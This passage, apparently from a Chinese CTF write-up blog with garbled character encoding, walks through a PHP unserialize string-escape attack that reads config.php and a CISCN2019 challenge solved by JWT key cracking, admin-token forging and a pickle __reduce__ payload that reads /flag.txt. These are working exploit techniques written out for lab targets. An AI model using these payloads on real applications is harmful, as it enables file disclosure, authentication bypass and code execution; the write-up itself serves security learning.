class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>åœ¨ <code>profile.php</code> ä¸­æœ‰ä¸ªæ–‡ä»¶è¯»å–çš„åœ°æ–¹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $profile = unserialize($profile);</span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">    $email = $profile[<span class="string">'email'</span>];</span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬å‘ç°è¿˜æœ‰ä¸ªååºåˆ—åŒ– <code>unserialize</code>ï¼Œæ„Ÿè§‰æœ‰æˆï¼Œå¦‚æœ <code>$profile[&#39;photo&#39;]</code>æ˜¯ <code>config.php</code> å°±å¯ä»¥è¯»å–åˆ°äº†ï¼Œå¯ä»¥å¯¹photoè¿›è¡Œæ“ä½œçš„åœ°æ–¹åœ¨ <code>update.php</code>ï¼Œæœ‰<code>phone</code>ã€<code>email</code>ã€<code>nickname</code> å’Œ <code>photo</code> è¿™å‡ ä¸ªã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"12345678901"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"123@163.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;s:<span class="number">3</span>:<span class="string">"123"</span>;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/804f743824c0451b2f60d81b63b6a900"</span>;&#125;</span><br><span class="line">print_r(unserialize($profile));</span><br><span class="line"></span><br><span class="line">ç»“æœå¦‚ä¸‹ï¼š</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [phone] =&gt; <span class="number">12345678901</span></span><br><span class="line">    [email] =&gt; <span class="number">123</span>@<span class="number">163.</span>com</span><br><span class="line">    [nickname] =&gt; <span class="number">123</span></span><br><span class="line">    [photo] =&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–ä¹‹åï¼Œæœ€åé¢uploadè¿™ä¸€éƒ¨åˆ†å°±æ²¡äº†ï¼Œä¸‹é¢å°±æ˜¯æƒ³åŠæ³•æŠŠ <code>config.php</code> å¡è¿›å»äº†ã€‚<br>ä»æ•°ç»„é¡ºåºä¸Šçœ‹æ˜¯å’Œä¸Šé¢æ•°ç»„çš„é¡ºåºä¸€æ ·çš„ï¼Œå¯ä»¥æŠ“ä¸ªåŒ…çœ‹ä¸‹posté¡ºåºï¼Œé‚£ä¹ˆæœ€æœ‰å¯èƒ½çš„å°±æ˜¯ä»nicknameä¸‹æ‰‹äº†ã€‚<br>åœ¨è®¾ç½®äº† <code>$profile</code> ä¹‹åï¼Œç”¨    <code>update_profile()</code> å‡½æ•°è¿›è¡Œå¤„ç†ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿›è¡Œäº†è¿‡æ»¤ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">    $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">    $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line">    </span><br><span class="line">    $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">    $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="laolao-å¤§ä½¬è§£é‡Šä¸ºä»€ä¹ˆè¦34ä¸ªwhere"><a href="#laolao-å¤§ä½¬è§£é‡Šä¸ºä»€ä¹ˆè¦34ä¸ªwhere" class="headerlink" title="laolao å¤§ä½¬è§£é‡Šä¸ºä»€ä¹ˆè¦34ä¸ªwhere"></a>laolao å¤§ä½¬è§£é‡Šä¸ºä»€ä¹ˆè¦34ä¸ªwhere</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"> </span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line">$s = <span class="string">'a:4:&#123;s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";a:1:&#123;i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"&#125;;s:5:"photo";s:10:"config.php";&#125;s:39:"upload/804f743824c0451b2f60d81b63b6a900";&#125;'</span>;</span><br><span class="line">var_dump(filter($s));</span><br><span class="line">var_dump(unserialize($s));</span><br><span class="line">var_dump(<span class="string">'&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;'</span>);</span><br><span class="line">$a = filter($s);</span><br><span class="line">var_dump($a);</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line">var_dump(<span class="string">'**************************************************'</span>);</span><br><span class="line"><span class="comment">// $profile = 'a:4:&#123;s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";s:8:"sea_sand";s:5:"photo";s:10:"config.php";&#125;s:39:"upload/804f743824c0451b2f60d81b63b6a900";&#125;';</span></span><br><span class="line">$profile = <span class="string">'a:4:&#123;s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";s:170:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";s:5:"photo";s:10:"config.php";&#125;s:39:"upload/804f743824c0451b2f60d81b63b6a900";&#125;'</span>;</span><br><span class="line"> </span><br><span class="line">var_dump($profile);</span><br><span class="line">var_dump(unserialize($profile));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">whereçš„codeé•¿åº¦ä¸º170ï¼Œå˜æˆhackeråé•¿åº¦ä¸º204ï¼ŒäºŒè€…åˆšå¥½å·®34ã€‚ç›´æ¥ä¼ ä¸€ä¸ª204çš„whereï¼ˆæ­¤æ—¶çš„åºåˆ—åŒ–è¯­å¥æ˜¯ä¸æ­£ç¡®çš„ï¼‰è®©filterå¸®æˆ‘ä»¬æ›¿æ¢æˆhackeræ„é€ ä¸€ä¸ª204çš„ï¼ˆè¿™ä¸ªåºåˆ—åŒ–è¯­å¥å°±æ˜¯æ­£ç¡®çš„äº†ï¼‰ï¼Œç„¶ååé¢çš„34çš„åºåˆ—åŒ–è¯­å¥ï¼Œå°±æ˜¯æˆ‘ä»¬è¦ä¼ ç»™photoçš„ï¼ŒæŠŠåŸæ¥çš„photoåºåˆ—åŒ–è¯­å¥ç»™æŒ¤å‡ºå»ã€‚</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/1697845-20191103011823574-878009239.png" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/1697845-20191103011823574-878009239.png" class="lazyload" title="test"></a></p>
<hr>
<p>åœ¨whereè¢«æ­£åˆ™åŒ¹é…æ¢æˆhackerä¹‹åï¼Œæ­£å¥½æ»¡è¶³é•¿åº¦<br>ç„¶ååé¢çš„ <code>&quot;34*where};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code> ä¹Ÿå°±ä¸æ˜¯ <code>nickname</code> çš„ä¸€éƒ¨åˆ†äº†ï¼Œè¢«ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè¢«å½“æˆphotoï¼Œå°±å¯ä»¥è¯»å–åˆ°config.phpçš„å†…å®¹äº†ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxp2h8j315y0gz0xm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxp2h8j315y0gz0xm.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åè¿›å…¥åˆ°profileä¸­æŸ¥çœ‹å›¾ç‰‡ä¿¡æ¯ï¼ŒæŠŠbase64ç è§£ç ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFne2E4NGZlMDNiLTBmOWUtNGIxNy1hNmYyLTM3YjA3MTZjNGMxOX0nOwo/Pgo=</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">'qwertyuiop'</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">'challenges'</span>;</span><br><span class="line">$flag = <span class="string">'flag&#123;a84fe03b-0f9e-4b17-a6f2-37b0716c4c19&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mh65zj30fm06d74j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mh65zj30fm06d74j.jpg" class="lazyload" title="test"></a><br>è¯´è¦ä¹°åˆ°Lv6ï¼Œ å…ˆæ¥ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ï¼Œæ‰¾åˆ°lv6</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://0049754d-13ec-4783-925e-ae2f190c2096.node3.buuoj.cn/shop?page="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">    r=requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">print</span> (i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<hr>
<p>æ‰¾åˆ°ä¹‹åå‘ç°è¦ä¸€å¤§å †é’±æ‰èƒ½ä¹°</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0ml0nyj30dg0eqq38.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0ml0nyj30dg0eqq38.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åè´­ä¹°çš„æ—¶å€™çœ‹åˆ°æ‰“æŠ˜ï¼Œå°è¯•æŠ“åŒ…ï¼ˆ<del>è–…ç¾Šæ¯›</del>ï¼‰<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mi1z2j30c80d2mxm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mi1z2j30c80d2mxm.jpg" class="lazyload" title="test"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0ms4mkj312u0g2jvu.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0ms4mkj312u0g2jvu.jpg" class="lazyload" title="test"></a></p>
<p>å›æ˜¾è¯´è¦adminç”¨æˆ·æ‰èƒ½ï¼Œè¡Œå§</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mjcofj30gj07dweh.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mjcofj30gj07dweh.jpg" class="lazyload" title="test"></a></p>
<hr>
<p>æŠ“åŒ…çœ‹åˆ°<a href="https://www.cnblogs.com/cjsblog/p/9277677.html" target="_blank" rel="noopener">JWT</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mtbdpj31010bnjuk.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mtbdpj31010bnjuk.jpg" class="lazyload" title="test"></a></p>
<p>Base64è§£ç åå¾—åˆ°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#123;&quot;username&quot;:&quot;123&quot;&#125;Â¶Â«Â”L&#x3D;ÂœmÃ°Â¢Ã–Ã™ÂŸJhÃÃ¶7Ã‰q&quot;&gt;[Â‡Â¿</span><br></pre></td></tr></table></figure></div>

<p>çœ‹åˆ° <code>username</code> æ˜¯æˆ‘è‡ªå·±çš„ç™»é™†å123ï¼Œè¿™é‡Œéœ€è¦æ”¹ä¸º <code>admin</code></p>
<p>åè¾¹è§£ç ä¸å‡ºæ¥å› ä¸ºç»è¿‡äº†sha256ï¼Œéœ€è¦ç ´è§£key<br>gitä¸Šæ‰¾åˆ°å·¥å…·ã€‚ï¼ˆ<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">å·¥å…·åœ°å€</a>ï¼‰</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mrmnbj30ol0243yy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mrmnbj30ol0243yy.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åä¼ªé€ æˆ‘ä»¬çš„jwt ï¼ˆ<a href="https://jwt.io/" target="_blank" rel="noopener">ç”ŸæˆJWTçš„ç½‘ç«™</a>ï¼‰<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mx5x4j313f0jbwg6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mx5x4j313f0jbwg6.jpg" class="lazyload" title="test"></a></p>
<p>å¥½çš„ è¿›æ¥äº†<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0musdlj30ea0d8mxd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0musdlj30ea0d8mxd.jpg" class="lazyload" title="test"></a></p>
<hr>
<p>åœ¨é¡µé¢æºç é‡Œçœ‹åˆ°äº†ä¸‹è½½ <code>www.zip</code> çš„è·¯å¾„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ui text container login-wrap-inf"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- æ½œä¼æ•Œåå·²ä¹…,åªèƒ½å¸®åˆ°è¿™äº† --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/static/asd1f654e683wq/www.zip"</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"visibility:hidden"</span>&gt;</span>åˆ åº“è·‘è·¯å‰æˆ‘ç•™äº†å¥½ä¸œè¥¿åœ¨è¿™é‡Œ<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ui segments center padddd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å¯¹æŠ—*ç«™é»‘ç§‘æŠ€ï¼Œç›®å‰ä¸ºæµ‹è¯•é˜¶æ®µï¼Œåªå¯¹ç®¡ç†å‘˜å¼€æ”¾ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ui segment"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/img/b.png"</span> <span class="attr">alt</span>=<span class="string">""</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<p>ä¸‹è½½ <code>www.zip</code> æ‰“å¼€ä¹‹åæ‰¾åˆ°äº†ä¸€ä¸ªpythonååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œåœ¨ <code>admin.py</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            <span class="comment"># pickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚</span></span><br><span class="line">            <span class="comment">#             # pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹æ‰€æœ‰çš„æ•°æ®ç±»å‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œ</span></span><br><span class="line">            <span class="comment">#             # pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚</span></span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="comment"># urllib.unquote:å°†å­˜å…¥çš„å­—å…¸å‚æ•°ç¼–ç ä¸ºURLæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå³è½¬æ¢æˆä»¥key1 = value1 &amp; key2 = value2çš„å½¢å¼</span></span><br><span class="line">            <span class="comment"># pickle.loads(bytes_object): ä»å­—èŠ‚å¯¹è±¡ä¸­è¯»å–è¢«å°è£…çš„å¯¹è±¡ï¼Œå¹¶è¿”å›</span></span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055" target="_blank" rel="noopener">å¤§ä½¬è®²Pythoné­”æ³•æ–¹æ³•çš„blog</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxnyi1j30nm0jcq9a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxnyi1j30nm0jcq9a.jpg" class="lazyload" title="test"></a></p>
<h3 id="payload-ç”Ÿæˆbecomeå‚æ•°çš„-ï¼Œpy2-7ç‰ˆæœ¬è¿è¡Œ"><a href="#payload-ç”Ÿæˆbecomeå‚æ•°çš„-ï¼Œpy2-7ç‰ˆæœ¬è¿è¡Œ" class="headerlink" title="payload[ç”Ÿæˆbecomeå‚æ•°çš„ ï¼Œpy2.7ç‰ˆæœ¬è¿è¡Œ]:"></a>payload[ç”Ÿæˆbecomeå‚æ•°çš„ ï¼Œpy2.7ç‰ˆæœ¬è¿è¡Œ]:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"><span class="comment"># __reduce__:å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚</span></span><br><span class="line"><span class="comment"># __reduce__ è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚</span></span><br><span class="line"><span class="comment"># å®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š</span></span><br><span class="line"><span class="comment">#       ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ã€æˆ‘ä»¬è¿™é‡Œçš„evalã€‘</span></span><br><span class="line"><span class="comment">#       ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼› ã€æˆ‘ä»¬è¿™é‡Œçš„open('/flag.txt','r').read()ã€‘</span></span><br><span class="line"><span class="comment">#       è¢«ä¼ é€’ç»™ __setstate__ çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›</span></span><br><span class="line"><span class="comment">#       ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›</span></span><br><span class="line"><span class="comment">#       ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="comment"># pickle.dumps(obj)ï¼šä»¥å­—èŠ‚å¯¹è±¡å½¢å¼è¿”å›å°è£…çš„å¯¹è±¡ï¼Œä¸éœ€è¦å†™å…¥æ–‡ä»¶ä¸­</span></span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å°±å¯ä»¥æ‰“å° <code>flag.txt</code> é‡Œçš„å†…å®¹äº†<br>å°†ç”Ÿæˆçš„payloadä¼ ç»™ <code>become</code>ï¼Œå¾—åˆ°flag</p>
